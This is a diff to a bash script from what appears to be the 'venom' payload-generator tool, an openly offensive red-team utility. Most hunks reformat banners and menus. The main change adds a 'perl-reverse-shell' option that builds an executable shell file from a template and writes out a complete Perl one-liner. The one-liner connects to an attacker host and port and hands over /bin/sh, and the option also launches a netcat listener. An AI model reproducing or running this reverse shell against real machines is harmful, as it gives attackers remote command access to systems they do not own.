@@ -181,7 +181,7 @@ echo "    |  build, embedded into one template (any language), obfuscated  |"
 echo "    |  (e.g pyherion.py) and compiled into one executable file.      |"
 echo "    |  'reproducing technics found in Veil,Unicorn,powersploit'      |"
 echo "    ╠────────────────────────────────────────────────────────────────╝"
-echo "    | Author:r00t-3xp10it | Suspicious Shell Activity (RedTeam)"
+echo "    | Author:r00t-3xp10it | Suspicious_Shell_Activity(RedTeam)"
 echo "    ╘ VERSION:$ver USER:$user INTERFACE:$InT3R DISTRO:$DiStR0"
 echo "" && echo ""
 sleep 2
@@ -4349,11 +4349,13 @@ cd $IPATH/
 sh_shellcode22 () {
 # module description
 cat << !
----
--- This module builds exe-service payloads to be
--- deployed onto windows service control manager (SCM)
--- module: [home]/shell/aux/deploy_service_payload.rb
----
+
+    ╔─────────────────────────────────────────────────────────────╗
+    |    This module builds exe-service payloads to be deployed   |
+    |  onto windows_service_control_manager(SCM) service-payload  |
+    |  Auxiliary module: venom-main/aux/deploy_service_payload.rb |
+    ╚─────────────────────────────────────────────────────────────╝
+
 !
 sleep 2
 # get user input to build shellcode
@@ -4378,7 +4380,7 @@ cat << !
 +------------------
 | LPORT   : $lport
 | LHOST   : $lhost
-| FORMAT  : EXE-SERVICE -> WINDOWS (SCM)
+| FORMAT  : EXE-SERVICE -> WINDOWS(SCM)
 |_PAYLOAD : $paylo
 
 !
@@ -4797,7 +4799,7 @@ cat << !
 
     ╔──────────────────────────────────────────────────────────────╗
     | This module uses system built-in tools sutch as bash, netcat |
-    | ssh, python, etc, and use them to spaw a tcp connection      |
+    |ssh, python, perl, etc, and use them to spaw a tcp connection |
     ╚──────────────────────────────────────────────────────────────╝
 
 !
@@ -4824,7 +4826,7 @@ lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 4444" --entry --wi
 
 
 # CHOSE WHAT PAYLOAD TO USE
-InSh3ll=$(zenity --list --title "☆ SYSTEM built-in SHELLS ☆" --text "\nThis module uses system built-in tools sutch\nas bash,netcat,ssh and use them to spaw a\ntcp connection (reverse or bind shell).\n\nAvailable shells:" --radiolist --column "Pick" --column "Option" TRUE "simple ssh shell" FALSE "simple bash shell" FALSE "simple reverse bash shell" FALSE "simple reverse netcat shell" FALSE "simple reverse python shell" FALSE "simple reverse python shell2" FALSE "simple powershell shell" FALSE "simple php reverse shell" FALSE "ruby Reverse_bash_shell" FALSE "ruby Reverse_bash_shell2" --width 350 --height 550) > /dev/null 2>&1
+InSh3ll=$(zenity --list --title "☆ SYSTEM built-in SHELLS ☆" --text "\nThis module uses system built-in tools sutch\nas bash,netcat,ssh and use them to spaw a\ntcp connection (reverse or bind shell).\n\nAvailable shells:" --radiolist --column "Pick" --column "Option" TRUE "simple ssh shell" FALSE "simple bash shell" FALSE "simple reverse bash shell" FALSE "simple reverse netcat shell" FALSE "simple reverse python shell" FALSE "simple reverse python shell2" FALSE "simple powershell shell" FALSE "simple php reverse shell" FALSE "ruby Reverse_bash_shell" FALSE "ruby Reverse_bash_shell2" FALSE "perl-reverse-shell" --width 350 --height 550) > /dev/null 2>&1
 
 
    # built-in systems shells
@@ -5018,6 +5020,32 @@ InSh3ll=$(zenity --list --title "☆ SYSTEM built-in SHELLS ☆" --text "\nThis 
      echo "---"
      sleep 3
      xterm -T " NETCAT LISTENER " -geometry 110x23 -e "sudo nc -l -v $lhost -p $lport"
+     sleep 2
+
+
+   elif [ "$InSh3ll" = "perl-reverse-shell" ]; then
+     cd $IPATH/templates/
+     N4m=$(zenity --title="☆ SHELL NAME ☆" --text "example: shell.pl" --entry --width 330) > /dev/null 2>&1
+     sed "s|IpAdDr|$lhost|" perl-reverse-shell.pl > simple.raw
+     sed "s|P0rT|$lport|" simple.raw > final.raw
+     rm $IPATH/templates/simple.raw > /dev/null 2>&1
+     mv final.raw $IPATH/output/$N4m > /dev/null 2>&1
+     chmod +x $IPATH/output/$N4m > /dev/null 2>&1
+
+     echo "[✔] Building -> perl reverse shell..."
+     echo "---"
+     echo "- Reverse connect using one-liner perl shell"
+     echo "- that uses bash and socket to forward a tcp connection"
+     echo "- http://pentestmonkey.net/tools/web-shells/perl-reverse-shell"
+     echo "-"
+     echo "- SHELL : perl -e 'use Socket;\$i=\"$lhost\";\$p=$lport;socket(S,PF_INET,SOCK_STREAM,"
+     echo "-         getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open"
+     echo "-         (STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
+     echo "- NETCAT: sudo nc -l -v $lhost -p $lport"
+     echo "---"
+     sleep 3
+     gedit $IPATH/output/$N4m & xterm -T " NETCAT LISTENER " -geometry 110x23 -e "sudo nc -l -v $lhost -p $lport"
+     zenity --title="☆ SYSTEM built-in SHELLS ☆" --text "Shell Stored Under:\n$IPATH/output/$N4m" --info > /dev/null 2>&1
      sleep 2
 
 
